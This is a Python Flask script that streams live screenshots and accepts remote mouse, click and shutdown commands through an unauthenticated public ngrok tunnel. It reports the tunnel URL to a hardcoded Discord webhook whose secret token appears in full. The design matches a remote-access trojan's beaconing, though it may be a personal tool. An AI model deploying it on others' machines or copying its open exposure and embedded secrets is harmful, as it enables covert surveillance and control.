from flask import Flask, render_template
from flask_socketio import SocketIO, emit
import threading
import time
import os
import pyautogui
from PIL import Image 
from pyngrok import ngrok # type: ignore
from discord_webhook import DiscordWebhook

path_to_cursor_folder = (os.path.join(os.path.dirname(os.path.abspath(__file__)), 'cursor',))
path_to_cursor = (os.path.join(path_to_cursor_folder, 'cursor.png',))
cursor_image = Image.open(path_to_cursor)
cursor_width, cursor_height = 16, 16

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)


button_states = {
    'Mouse Left': False,
    'Mouse Down': False,
    'Mouse Right': False,
    'Mouse Up': False,
    'Left Click': False,
    'Right Click': False,
    'Shutdown': False
}

def continuous_action(button_id):
    while button_states[button_id]:

        if button_id == 'Mouse Left':
            xx, yy = pyautogui.position()
            pyautogui.moveTo(xx - 30, yy)

        elif button_id == 'Mouse Up':
            xx, yy = pyautogui.position()
            pyautogui.moveTo(xx, yy - 30)
            
        elif button_id == 'Mouse Right':
            xx, yy = pyautogui.position()
            pyautogui.moveTo(xx + 30, yy)
            
        elif button_id == 'Mouse Down':
            xx, yy = pyautogui.position()
            pyautogui.moveTo(xx, yy + 30)
            
        elif button_id == 'Left Click':
            pyautogui.leftClick(duration=0.2)
            time.sleep(0.5)
            
        elif button_id == 'Right Click':
            pyautogui.rightClick(duration=0.2)
            time.sleep(0.5)
            
        elif button_id == 'Shutdown':
            time.sleep(2)
            os.system("shutdown /s /t 1")
            
            
        time.sleep(0.25) 

def take_screenshots():
    while True:
        screenshot_path = os.path.join(app.static_folder, 'images', 'screenshot.png')
        screenshot = pyautogui.screenshot()
        x, y = pyautogui.position()
        final_x = x - cursor_width // 2
        final_y = y - cursor_height // 2
        paste_position = (final_x, final_y)
        screenshot.paste(cursor_image, paste_position, cursor_image)
        screenshot.save(screenshot_path)
        socketio.emit('update_image', {'src': screenshot_path})
        time.sleep(0.25)

@socketio.on('connect')
def handle_connect():
    emit('button_states', button_states)

@socketio.on('toggle_button')
def handle_toggle_button(data):
    button_id = data['buttonId']
    if button_id in button_states:
        button_states[button_id] = not button_states[button_id]
        
        if button_states[button_id]:
            action_thread = threading.Thread(target=continuous_action, args=(button_id,))
            action_thread.start()
        else:
            print(f'Button {button_id} is toggled off')
        
        emit('button_states', button_states, broadcast=True)
port = 5000
@app.route('/')
def home():
    return render_template('index.html')

if __name__ == '__main__':
    screenshot_thread = threading.Thread(target=take_screenshots)
    screenshot_thread.daemon = True 
    screenshot_thread.start()

    public_url = ngrok.connect(5000)
    print(" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:5000:{}/\"".format(public_url, port))
    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1277325619482591334/odNBwGAG9rfzNwPy2G2YDFlHusg_bfdKwhEvwnd79MdXspdGzg1b3wzZ1Bc2U9cmJiiq", content=" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:5000:{}/\"".format(public_url, port))
    webhook.execute()
    socketio.run(app, debug=False)
    time.sleep(3)